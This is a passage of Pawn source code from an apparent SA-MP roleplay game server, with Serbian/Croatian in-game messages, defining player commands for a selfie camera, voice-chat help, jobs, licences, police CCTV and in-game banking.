		if( Degree[ playerid ] >= 360 ) Degree[ playerid ] = 0;
		Degree[ playerid ] += SelfieSpeed;
		n1X = lX[ playerid ] + SelfieRadius * floatcos(Degree[ playerid ], degrees);
		n1Y = lY[ playerid ] + SelfieRadius * floatsin(Degree[ playerid ], degrees);
		SetPlayerCameraPos(playerid, n1X, n1Y, lZ[ playerid ] + SelfieHeight);
		SetPlayerCameraLookAt(playerid, lX[ playerid ], lY[ playerid ], lZ[ playerid ]+1);
		SetPlayerFacingAngle(playerid, Degree[ playerid ] - 90.0);
		takingselfie[ playerid ] = true;
		ApplyAnimation(playerid, "PED", "gang_gunstand", 4.1, 1, 1, 1, 1, 1, 1);

		SendInfoMessage( playerid, "Da pomeras kameru koristi {FFFFFF}'NUM-4' {4282C0}i {FFFFFF}'NUM-6'." );
		SendInfoMessage( playerid, "Da ugasis selfie mod koristi {FFFFFF}[ /selfie ]." );
	}
    else
	{
	    SMG_TogglePlayerControllable( playerid, true );
		SetCameraBehindPlayer( playerid );
	    takingselfie[ playerid ] = false;
	    ApplyAnimation( playerid, "PED", "ATM", 4.1, 0, 1, 1, 0, 1, 1 );
	}
    return 1;
}

CMD:discord( playerid )
{
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	strcat( DialogStrgEx, "{FFFFFF}1: Sa sajta {4282C0}https://discordapp.com/download {FFFFFF}skinite najnoviju verziju Discorda.\n");
	strcat( DialogStrgEx, "2: Instalirajte {4282C0}Discord {FFFFFF}i kliknite na {4282C0}\"Dodaj Server\"\n");
	strcat( DialogStrgEx, "{FFFFFF}3: Nakon toga otvara vam se novi prozor tamo odablirete pridruzi se serveru i unosite sledece podatke:\n");
	strcat( DialogStrgEx, "\tAdresa: {4282C0}discord.ultimate-rpg.com\n");
	strcat( DialogStrgEx, "{FFFFFF}4: Kada to uradite kliknite {4282C0}\"Pridruzi se\" {FFFFFF}i bicete konektovani na nas Discord server.\n");
	strcat( DialogStrgEx, "5: U default kanalu sacekajte da vas admin prevuce u kanal Admin tima\n");
	strcat( DialogStrgEx, "6: Nakon sto se admin uveri da posedujete mikrofon, da imate podesen mikrofon na\n");
	strcat( DialogStrgEx, "\t{4282C0}\"PUSH TO TALK\"{FFFFFF}, da igrate na nekom od nasih servera i da ste lvl 3+ dobicete normal\n");
	strcat( DialogStrgEx, "\tsa kojim mozete ulaziti u druge kanale i praviti svoj kanal.\n");
	strcat( DialogStrgEx, "7: Uzivajte.");
    ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Discord Help:", DialogStrgEx, "OK", "" );

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:teamspeak( playerid )
{
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );

	strcat( DialogStrgEx, "{FFFFFF}1: Sa sajta {4282C0}https://www.teamspeak.com/en/downloads/ {FFFFFF}skinite najnoviju verziju Teamspeaka.\n");
	strcat( DialogStrgEx, "2: Instalirajte {4282C0}TeamSpeak {FFFFFF}i kliknite na {4282C0}\"Connections > Connect\"\n");
	strcat( DialogStrgEx, "{FFFFFF}3: Nakon toga otvara vam se novi prozor tamo odablirete pridruzi se serveru i unosite sledece podatke:\n");
	strcat( DialogStrgEx, "\tAdresa: {4282C0}ts3.ultimate-rpg.com\nNickname: Vase Ime_Prezime sa servera\n");
	strcat( DialogStrgEx, "{FFFFFF}4: Kada to uradite kliknite {4282C0}\"Connect\" {FFFFFF}i bicete konektovani na nas Teamspeak server.\n");
	strcat( DialogStrgEx, "5: U default kanalu sacekajte da vas admin prevuce u kanal Admin tima\n");
	strcat( DialogStrgEx, "6: Nakon sto se admin uveri da posedujete mikrofon, da imate podesen mikrofon na\n");
	strcat( DialogStrgEx, "\t{4282C0}\"PUSH TO TALK\"{FFFFFF}, da igrate na nekom od nasih servera i da ste lvl 3+ dobicete normal\n");
	strcat( DialogStrgEx, "\tsa kojim mozete ulaziti u druge kanale i praviti svoj kanal.\n");
	strcat( DialogStrgEx, "7: Uzivajte.");
    ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, "{FFFFFF}Teamspeak Help:", DialogStrgEx, "OK", "" );

    strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ) );
	return 1;
}

CMD:forum(playerid) 
{
	SendClientMessage( playerid, 0x4282C0FF, "(U): Adresa naseg foruma je: {FFFFFF}"SERVER_WEB"");
	SendClientMessage( playerid, 0x4282C0FF, "(U): Na forum se registrujete sa vasim nickom iz igre.");
	SendClientMessage( playerid, 0x4282C0FF, "(U): Obavezno procitajte pravila kako ne bi doslo do sankcionisanja.");
	return 1;
}

CMD:donacije( playerid ) return SendClientMessage(playerid, 0x4282C0FF, "(U): Listu donacija imate na {FFFFFF}"SERVER_WEB"");

CMD:igrice( playerid )
{
	if( PlayerInfo[ playerid ][ xLevel ] < 2 ) return SendErrorMessage( playerid, "Ne mozes ako nisi level 2+." );
	if( uInterijeru[ playerid ] != Interiors[5] ) return SendErrorMessage( playerid, "Moras biti u igraonici." );
	if( tdm_player_info[ playerid ][ tdm_Team ] != 0 || NaDmEventu[ playerid ]) return SendErrorMessage( playerid, "Vec si u jednoj igri, prvo izadji iz nje." );

	ShowPlayerDialog( playerid, dialog_IGRAONICA, DIALOG_STYLE_LIST, "{FFFFFF}Izaberite igricu:",
																								"{4282C0}(1). {FFFFFF}Counter Strike 1.6\n\
																								{4282C0}(2). {FFFFFF}Need For Speed - 1 vs 1", "Odaberi", "Odustani" );
	return 1;
}

CMD:napustitdm( playerid )
{
	if( tdm_player_info[ playerid ][ tdm_Team ] == 0 ) return SendErrorMessage( playerid, "Nisi na TDM serveru da bi ga napustio." );

	if( tdm_player_info[ playerid ][ tdm_Team ] == 1 ) tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ]--;
	else if( tdm_player_info[ playerid ][ tdm_Team ] == 2 ) tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ]--;

	new tdm_str[ 20 ];
	format( tdm_str, sizeof( tdm_str ), "~b~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ctPlayers ] );
	TextDrawSetString( TDM_gTD[ 18 ], tdm_str );
	format( tdm_str, sizeof( tdm_str ), "~r~players:_%02d", tdm_mapInfo[ tdm_ServerMap ][ ttPlayers ] );
	TextDrawSetString( TDM_gTD[ 20 ], tdm_str );

    sql_user_update_integer( playerid, "cstdm_score", PlayerInfo[ playerid ][ xCSTDMScore ] );

    for( new i = 0; i < 5; i++) SendDeathMessageToPlayer( playerid, 6000, 5005, 255 );

	tdm_player_info[ playerid ][ tdm_Team ] = 0;
	tdm_player_info[ playerid ][ tdm_Kill ] = 0;
	tdm_player_info[ playerid ][ tdm_KillinaROW ] = 0;
	tdm_player_info[ playerid ][ tdm_Death ] = 0;

	SetPlayerHealth( playerid, 50+PlayerInfo[playerid][xSHealth] );
	SetPlayerArmour( playerid, 0 );

	SMG_SetPlayerSkin( playerid, PlayerInfo[ playerid ][ xSkin ] );
	ResetPlayerWeapons( playerid );

	SMG_SetPlayerPos( playerid, PozicijaWAR[ playerid ][ 0 ], PozicijaWAR[ playerid ][ 1 ],  PozicijaWAR[ playerid ][ 2 ] );
    UcitajObjekte( playerid );
	SetCameraBehindPlayer( playerid );
	SetPlayerVirtualWorld( playerid, 187 );
    SetPlayerInterior( playerid, InteriorWAR[ playerid ] );

	SendInfoMessage( playerid, "Napustili ste CS:TDM server." );

	for( new i = 0; i < 21; i ++) TextDrawHideForPlayer( playerid, TDM_gTD[ i ] );

	PlayerTextDrawHide( playerid, TDMplayerScore_pTD[ playerid ] );
	PlayerTextDrawDestroy( playerid, TDMplayerScore_pTD[ playerid ] );
	TDMplayerScore_pTD[ playerid ] = PlayerText:INVALID_TEXT_DRAW;
	return 1;
}

CMD:takejob( playerid )
{
	if( PlayerInfo[ playerid ][ xPosao ] == 0 )
	{
		if( GetPlayerState( playerid ) == 1 )
		{
			if( ChosenJob[ playerid ] != 0 )
			{
			    if( !IsPlayerInRangeOfPoint( playerid, 5.0, jobsInfos[ ChosenJob[ playerid ]-1 ][ jTakeJobPos ][ 0 ], jobsInfos[ ChosenJob[ playerid ]-1 ][  jTakeJobPos ][ 1 ], jobsInfos[ ChosenJob[ playerid ]-1 ][ jTakeJobPos ][ 2 ] ) ) return SendErrorMessage( playerid, "Morate stajati na pickupu da bi uzeli posao!");

				switch(ChosenJob[ playerid ])
				{
					case POSAO_MEHANICAR:
					{
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Mehanicar." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/mechanic" );
					}
					case POSAO_PMUNICIJE:
					{
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Proizvodjac Municije." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );
					}
					case POSAO_PILOT:
					{
					    if( PlayerInfo[ playerid ][ xLetelica ] == 0 ) return SendErrorMessage( playerid, "Ne posedujes dozvolu za avion/helic." );
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Pilot." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );
					}
					case POSAO_RUDAR:
					{
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Rudar." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );
					}
					case POSAO_PNOVCA:
					{
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Prevoznik Novca." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );
					}
					case POSAO_UBERDRIVER: 
					{
						if(PlayerInfo[playerid][xVozacka] == 0) return SendErrorMessage(playerid, "Ne posjedujes dozvolu za auto.");
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Uber." );
					    SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );
					}
					case POSAO_PNAMJESTAJA: 
					{
					    SendJobMessage( playerid, "Cestitamo, uspesno ste se zaposlili kao Proizvodac namjestaja." );
					   	SendJobMessage( playerid, "Komande posla: {FFFFFF}/posao {36AB00}| {FFFFFF}/uniforma {36AB00}| {FFFFFF}/stopwork {36AB00}| {FFFFFF}/posaoskillovi" );						
					}
				}
				PlayerInfo[ playerid ][ xPosao ] = ChosenJob[ playerid ];

				new q[ 100 ];
				mysql_format( mSQL, q, sizeof(q), "UPDATE `users` SET `job_id` = '%d' WHERE `user_id` = '%d' LIMIT 1", PlayerInfo[ playerid ][ xPosao ], PlayerInfo[ playerid ][ xID ] );
				mysql_tquery( mSQL, q );
            }
			else SendErrorMessage( playerid, "Morate stajati na pickupu da bi uzeli posao!");
		}
		else SendErrorMessage( playerid, "Ne smete biti u vozilu!");
	}
	else SendErrorMessage( playerid, "Vec imate posao! Koristite {FFFFFF}[ /quitjob ] {FF0000}da date otkaz!");
	return 1;
}

CMD:vipskin( playerid )
{
	if( PlayerInfo[ playerid ][ xAdmin ] < 1 && PlayerInfo[ playerid ][ xVIPLevel ] < 2 && PlayerInfo[ playerid ][ xPromoter ] < 3) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );

    if( PlayerCuffed[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si tazovan ili cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );
    if( UzeoOpremu[ playerid ] ) return SendErrorMessage(playerid, "Ne mozes dok imas uniformu.");

    if(PlayerInfo[playerid][xPol] == 1) ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aMaleSkins, sizeof(g_aMaleSkins));
	else ShowModelESelectionMenu(playerid, "Select Skin", MENU_SKIN, g_aFemaleSkins, sizeof(g_aFemaleSkins));
    return 1;
}
alias:vipskin("askin", "pskin");

CMD:refresh( playerid )
{
	if( GetPlayerInterior( playerid ) > 0 ) return SendErrorMessage(playerid, "U interijeru si ne mozes koristiti ovu komandu.");
	if( !PlayerFreezed[ playerid ] ) return SendErrorMessage(playerid, "Zaledjen si ne mozes koristiti ovu komandu.");
    if( PlayerCuffed[ playerid ] > 0 ) return SendErrorMessage( playerid, "Ne mozes dok si tazovan ili cuffovan." );
    if( IgracZavezan[ playerid ] == true ) return SendErrorMessage( playerid, "Ne mozes na izazov dok si vezan." );
	if( ZlatoVreme[ playerid ] > 0 || PljackaVreme[ playerid ] > 0 || gZone_Time[ playerid ] > 0 ) return SendErrorMessage(playerid, "Ne mozete to.");

	if( gettime() < AlreadyRefreshed[ playerid ] ) return SendErrorMessage( playerid, "Sacekaj %dsec vec ste koristili ovu komandu.", AlreadyRefreshed[ playerid ] - gettime() );
	if( GetPlayerSpecialAction( playerid ) == SPECIAL_ACTION_USEJETPACK ) return SendErrorMessage (playerid, "Koristis jetpack, da ga skines kucaj {FFFFFF}[ /jetpack ].");

	SetPlayerInterior( playerid, 0 );
	SetPlayerVirtualWorld( playerid, 0 );

	if( !IsPlayerInAnyVehicle( playerid ) )
	{
		new Float:PosX, Float:PosY, Float:PosZ;
		GetPlayerPos( playerid, PosX, PosY, PosZ );
		SMG_SetPlayerPos( playerid, PosX, PosY, PosZ+0.3 );
	}
	Streamer_Update(playerid);
	AlreadyRefreshed[ playerid ] = gettime()+5;
	SendInfoMessage( playerid, "Osvezeni ste, ako imate nekih problema kontaktirajte A/GM team." );
	return 1;
}
alias:refresh( "osvezi" );

CMD:help(playerid) 
{
    ShowPlayerDialog(playerid, dialog_HELP, DIALOG_STYLE_LIST, "{FFFFFF}Pomoc:",
																				"{4282C0}(1). {FFFFFF}Uopsteno\n\
																				{4282C0}(2). {FFFFFF}Animacije\n\
																				{4282C0}(3). {FFFFFF}Chat\n\
																				{4282C0}(4). {FFFFFF}Admin\n\
																				{4282C0}(5). {FFFFFF}Spec Admin\n\
																				{4282C0}(6). {FFFFFF}Gamemaster\n\
																				{4282C0}(7). {FFFFFF}VIP\n\
																				{4282C0}(8). {FFFFFF}Vodja Lidera\n\
																				{4282C0}(9). {FFFFFF}Lider\n\
																				{4282C0}(10). {FFFFFF}Organizacija\n\
																				{4282C0}(11). {FFFFFF}Savez\n\
																				{4282C0}(12). {FFFFFF}Posao\n\
																				{4282C0}(13). {FFFFFF}Vozilo\n\
																				{4282C0}(14). {FFFFFF}Imovina\n\
																				{4282C0}(15). {FFFFFF}Firma\n\
																				{4282C0}(16). {FFFFFF}Torba\n\
																				{4282C0}(17). {FFFFFF}Mobitel\n\
																				{4282C0}(18). {FFFFFF}Banka\n\
																				{4282C0}(19). {FFFFFF}Bingo\n\
																				{4282C0}(20). {FFFFFF}Pljacka\n\
																				{4282C0}(21). {FFFFFF}Promoter\n\
																				{4282C0}(22). {FFFFFF}YouTuber", "Potvrdi", "Zatvori");
	return 1;
}

CMD:pokazidozvole( playerid, const params[] )
{
    new playerID;
    if( sscanf( params, "u", playerID ) ) return SendUsageMessage( playerid, "/pokazidozvole [id]");
	if( IsPlayerConnected( playerID ) )
	{
		if( playerID != IPI )
		{
		    if( IsPlayerNearPlayer( 8.0, playerid, playerID ) )
			{
			    if( playerid == playerID ) return SendErrorMessage( playerid, "Ne mozes pokazati license samom sebi, koristi [ /dozvole ].");

				new string[50];
                format(string, sizeof(string), "{FFFFFF}Ime: {4282C0}%s:", ImeIgraca( playerid ) );

				format(DialogStrgEx, sizeof(DialogStrgEx),
															"{4282C0}Dozvola za voznju: {FFFFFF}%s\n\
															{4282C0}Dozvola za plovidbu: {FFFFFF}%s\n\
															{4282C0}Dozvola za letenje: {FFFFFF}%s",
																((PlayerInfo[playerid][xVozacka]) ? ("Da") : ("Ne")),
																((PlayerInfo[playerid][xBrodska]) ? ("Da") : ("Ne")),
																((PlayerInfo[playerid][xLetelica]) ? ("Da") : ("Ne")));

				ShowPlayerDialog( playerID, 0, DIALOG_STYLE_MSGBOX, string, DialogStrgEx, "OK", "" );
				strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));

                SendNearbyMessage(playerid, 20.0, 0xC2A2DAFF, "* %s pokazuje dozvole %s.", ImeIgraca( playerid ), ImeIgraca( playerID ) );
			}
			else SendErrorMessage( playerid, "Taj igrac nije blizu vas.");
		}
	}
	else SendErrorMessage( playerid, "Taj igrac nije online.");
    return 1;
}

CMD:dozvole( playerid )
{
	format(DialogStrgEx, sizeof(DialogStrgEx),
											    "{4282C0}Dozvola za voznju: {FFFFFF}%s\n\
												{4282C0}Dozvola za plovidbu: {FFFFFF}%s\n\
												{4282C0}Dozvola za letenje: {FFFFFF}%s",
													((PlayerInfo[playerid][xVozacka]) ? ("Da") : ("Ne")),
													((PlayerInfo[playerid][xBrodska]) ? ("Da") : ("Ne")),
													((PlayerInfo[playerid][xLetelica]) ? ("Da") : ("Ne")));

	ShowPlayerDialog( playerid, 0, DIALOG_STYLE_MSGBOX, D_NASLOV, DialogStrgEx, "OK", "" );
	strdel( DialogStrgEx, 0, sizeof( DialogStrgEx ));
    return 1;
}

CMD:cctv( playerid )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
        if( PlayerInfo[ playerid ][ xZatvor ] > 0 ) return SendErrorMessage( playerid, "Ne mozes kamere dok si u zatvoru." );
        if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
		if( inOrgInt[ playerid ] != PlayerInfo[ playerid ][ xClan ] ) return SendErrorMessage( playerid, "Morate biti u interijeru vase organizacije." );

		ShowPlayerDialog( playerid, dialog_CCTV, DIALOG_STYLE_LIST, "{FFFFFF}Izaberi kameru:",
																								"Spoljasnost banke\n\
																								Unutrasnjost banke 1\n\
																								Unutrasnjost banke 2\n\
																								Unutrasnjost banke 3\n\
																								Unutrasnjost banke 4", "Potvrdi", "Odustani" );
       	SMG_TogglePlayerControllable( playerid, false );
       	WatchingTV{ playerid } = 1;
       	SendInfoMessage( playerid, "Da ugasis kamere ukucaj {FFFFFF}[ /ugasikamere ]." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:ugasikamere( playerid )
{
    if( GetFactionType( playerid ) == ORG_TIP_VLADINA )
	{
        if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");
        if( WatchingTV{ playerid } == 1 )
		{
		    new id = PlayerInfo[ playerid ][ xClan ];
		    SMG_SetPlayerPos( playerid, org_info[ id ][ oPozIntX ], org_info[ id ][ oPozIntY ], org_info[ id ][ oPozIntZ ] );
		  	UcitajObjekte( playerid );
		  	SetCameraBehindPlayer( playerid );
		   	SetPlayerInterior( playerid, org_info[ id ][ oInt ] );
			SetPlayerVirtualWorld( playerid, org_info[ id ][ oVw ] );
		    WatchingTV{ playerid } = 0;
		    SendInfoMessage( playerid, "Ugasili ste sigurnosne kamere." );
		}
		else return SendErrorMessage( playerid, "Ne mozes ugasiti kamere koje nisi upalio." );
	}
	else return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	return 1;
}

CMD:clear( playerid, const params[] )
{
	if( GetFactionType( playerid ) != ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Niste u mogucnosti koristiti ovu komandu." );
	if( PoliceDuty[ playerid ] == false ) return SendErrorMessage( playerid, "Da bi koristio ovu komandu moras biti policajac na duznosti!");

	new id;
	if( sscanf( params, "u", id ) ) return SendUsageMessage( playerid, "/clear [id]");
    if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID Korisnika");
	if( GetFactionType( id ) == ORG_TIP_VLADINA ) return SendErrorMessage( playerid, "Ne mozes ocistiti PD/SD clanu." );

	PlayerInfo[ id ][ xWanted ] = 0;
	sql_user_update_integer( id, "wanted_level", PlayerInfo[ id ][ xWanted ] );
   	SMG_SetPlayerWantedLevel( id, PlayerInfo[ id ][ xWanted ] );
    strmid( ZlocinInfo[ id ][zPrijavio], "Nema", 0, strlen("Nema"), 255);
	strmid( ZlocinInfo[ id ][zPocinio], "Nema", 0, strlen("Nema"), 255);
	strmid( ZlocinInfo[ id ][zZlocin], "Nema", 0, strlen("Nema"), 255);
    SCMF( playerid, 0x33CCFFFF, "(CLEAR): Obrisali ste dosije gradjaninu {FFFFFF}%s.", ImeIgraca( id ) );
 
	DodajWarnRed("~y~(CLEAR) %s ~w~je ocisti%s WL igracu ~y~%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
 
	OrgPorukaLeader( PlayerInfo[ playerid ][ xClan ], 0xD2CFCFFF, "#CLEAR: {FFFFFF}%s {D2CFCF}je ocisti%s WL igracu {FFFFFF}%s.", ImeIgraca( playerid ), getPolForString(playerid, "o", "la"), ImeIgraca( id ) );
	return 1;
}

new BanderaSreceDonate;
CMD:doniraj( playerid, const params[] )
{
	new cash;
    if(sscanf(params, "i", cash)) return SendUsageMessage(playerid, "/doniraj [iznos]");
	if(!IsPlayerInRangeOfPoint(playerid, 10.0, 1133.5189, -936.0316, 47.7939)) return SendErrorMessage(playerid, "Morate biti pored bandere.");
	if(cash < 50000 || cash > 10000000) return SendErrorMessage(playerid, "Iznos ne moze biti manji od 50.000$ i preko 10.000.000$.");
	if(PlayerInfo[playerid][xLevel] < 3) return SendErrorMessage(playerid, "Samo level 3+");
	if(PlayerInfo[playerid][xNovac] < cash) return SendErrorMessage(playerid, "Nemate toliko novca.");
	if(gettime() < BanderaSreceDonate) return SendErrorMessage(playerid, "Netko je vec donirao sacekaj (%d) sec.", BanderaSreceDonate - gettime());
	
	BanderaSreceDonate = gettime()+10;

	DajIgracuNovac(playerid, -cash);
    SendClientMessageToAllEx(-1, ">> BANDERA SRECE: %s je upravo donira%s $%s gradu.", ImeIgraca(playerid), getPolForString(playerid,"o","la"), fNumber(cash));
    WriteLog("log-bandera", "%s je donira%s $%d banderi srece.", ImeIgraca(playerid), getPolForString(playerid,"o","la"), cash);

    foreach(new i : Player)
	{
        if(i != playerid)
		{
	    	if(IsPlayerInRangeOfPoint(i, 10.0, 1133.5189, -936.0316, 47.7939))
			{
	    	    DajIgracuNovac(i, cash/80);
	    	    SCMF(i, 0x4282C0FF, "[DONACIJA]: {FFFFFF}Dobili ste {4282C0}($%s) {FFFFFF}od donacije gradu.", fNumber(cash/80));
	    	}
		}

    }
    return 1;
}

CMD:withdraw( playerid, const params[] )
{
	new cashdeposit;
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7136,-25.5145,1004.4440) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");
	if( sscanf( params, "i", cashdeposit ) ) return SendUsageMessage( playerid, "/withdraw [iznos]");
	if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novaca.");

	DajIgracuNovac( playerid, cashdeposit );
	PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit;
	SCMF( playerid, ZUTA, "(BANKA): Podigli ste {FFFFFF}($%s) {FFFF00}s vaseg racuna.", fNumber(cashdeposit));
	UpdateBankTD( playerid );

	if(questInfo[playerid][qt_EasyQuest][0] == false) {
		questInfo[playerid][qt_EasyQuest][0] = true;
		sql_UpdateQuest(playerid);

		KillTimer(QuestTimer[playerid]);
		quest_CreateTDs(playerid, false);

		quest_CreateTDs(playerid, true);
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][4], "CESTITAMO, RIJESILI STE ~p~ZADATAK BR.1");
		PlayerTextDrawSetString(playerid, quest_pTD[playerid][5], "Nagradu mozete preuzeti~n~~p~(/zadaci pocetni)");

		QuestTimer[playerid] = SetPlayerTimerEx(playerid, "questDone", 10000, 10000, "ii", playerid, 1);
	}
	sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
	return 1;
}

CMD:balance( playerid )
{
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7212,-23.2731,1004.4440) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");
	SCMF( playerid, ZUTA, "(BANKA): Imate {FFFFFF}($%s) {FFFF00}na vasem bankovnom racunu.", fNumber(PlayerInfo[playerid][xBRacun]));
	return 1;
}

CMD:podignikredit( playerid )
{
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7201,-32.4292,1004.4440) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");
    ShowPlayerDialog( playerid, dialog_KREDIT, DIALOG_STYLE_LIST, D_NASLOV, "Kredit - 20000$ (Level 5)\nKredit - 50000$ (Level 10)\nKredit - 80000$ (Level 15)\nKredit - 100000$ (Level 20)", "Potvrdi", "Odustani" );
	return 1;
}

CMD:kredit( playerid )
{
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7206,-34.7188,1004.4449) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");
    if( PlayerInfo[ playerid ][ xPreostaloZaOtplatu ] == 0 ) return SendErrorMessage( playerid, "Nemate podignut kredit.");
	ShowPlayerDialog( playerid, dialog_INFOKREDIT, DIALOG_STYLE_LIST, D_NASLOV,
																				"{4282C0}(1). {FFFFFF}Info\n\
																				{4282C0}(2). {FFFFFF}Promena iznosa rate\n\
																				{4282C0}(3). {FFFFFF}Otplati ceo kredit", "Potvrdi", "Odustani" );
	return 1;
}

CMD:deposit( playerid, const params[] )
{
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7097,-27.8027,1004.4440) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");

    new cashdeposit, curfunds = PlayerInfo[ playerid ][ xBRacun ];
	if( sscanf( params, "i", cashdeposit ) ) return SendUsageMessage( playerid, "/deposit [iznos]");
	if( cashdeposit > PlayerInfo[ playerid ][ xNovac ] || cashdeposit < 1) return SendErrorMessage( playerid, "Nemate toliko novaca.");

	DajIgracuNovac( playerid, -cashdeposit );
	PlayerInfo[ playerid ][ xBRacun ] += cashdeposit;

	SCMF( playerid, ZUTA, "(BANKA): Stari iznos {FFFFFF}($%s), {FFFF00}pohrana {FFFFFF}($%s), {FFFF00}novi iznos {FFFFFF}($%s).", fNumber(curfunds), fNumber(cashdeposit), fNumber(PlayerInfo[playerid][xBRacun]));

	UpdateBankTD( playerid );

	sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
	return 1;
}

CMD:transfer( playerid, const params[] )
{
    if( !IsPlayerInRangeOfPoint(playerid, 2.0, 1381.7151,-30.1245,1004.4440) ) return SendErrorMessage( playerid, "Morate biti u banci da bi ste mogli koristit ovu komandu.");

    new id, cashdeposit;
	if( sscanf( params, "ui", id, cashdeposit ) ) return SendUsageMessage( playerid, "/transfer [id] [iznos]");
	if( cashdeposit > PlayerInfo[ playerid ][ xBRacun ] || cashdeposit < 1 ) return SendErrorMessage( playerid, "Nemate toliko novaca.");
	if( id == IPI ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
	if( id == playerid ) return SendErrorMessage( playerid, "Pogresan ID igraca." );
	if( PlayerInfo[ playerid ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Morate biti level 5+." );
	if( PlayerInfo[ id ][ xLevel ] < 5 ) return SendErrorMessage( playerid, "Igrac mora biti level 5+." );
	if( cashdeposit < 1 || cashdeposit > 10000000 ) return SendErrorMessage( playerid, "Svota novca ne sme ici preko 10.000.000$ ili ispod 1$" );

	PlayerInfo[ playerid ][ xBRacun ] -= cashdeposit;
    PlayerInfo[ id ][ xBRacun ] += cashdeposit;
	PlayerPlaySound( playerid, 1052, 0.0, 0.0, 0.0);

	sql_user_update_integer( playerid, "xBRacun", PlayerInfo[ playerid ][ xBRacun ] );
	sql_user_update_integer( id, "xBRacun", PlayerInfo[ id ][ xBRacun ] );
	UpdateBankTD( playerid );
	UpdateBankTD( id );

	SCMF( playerid, ZUTA,   "(BANKA): Prebaci%s si sa svoga racuna {FFFFFF}($%s) {FFFF00}na {FFFFFF}%s-%s {FFFF00}racun.", getPolForString(playerid, "o", "la"), fNumber(cashdeposit), ImeIgraca( id ), getPolForString(id, "ov", "in") );
	SCMF( id, ZUTA, 		"(BANKA): Primi%s si {FFFFFF}($%s) {FFFF00}na svoj racun od {FFFFFF}%s.", getPolForString(id, "o", "la"), fNumber(cashdeposit), ImeIgraca( playerid ), playerid );
 
	AdminMsg(0xFFC0CBAA, "#TRANSFER: %s > %s [ $%s ]", ImeIgraca( playerid ), ImeIgraca( id ), fNumber(cashdeposit));

	WriteLog("log-transfer", "Igrac %s -> Igrac: %s | Novac: %d", ImeIgraca( playerid ), ImeIgraca( id ), cashdeposit);
	return 1;
}

CMD:me( playerid, const params[] )
{
    if( gettime() < PlayerInfo[ playerid ][ xMute ] ) return SendErrorMessage( playerid, "Ne mozete pricati, usutkani ste.");
    if( Spectate[playerid] != -1 ) return SendErrorMessage( playerid, "Ne mozes pricati dok specas.");

	if( isnull( params ) ) return SendUsageMessage( playerid, "/me [akcija]" );

	for( new b = 0; b < sizeof( ZabranjeneReci ); b++)
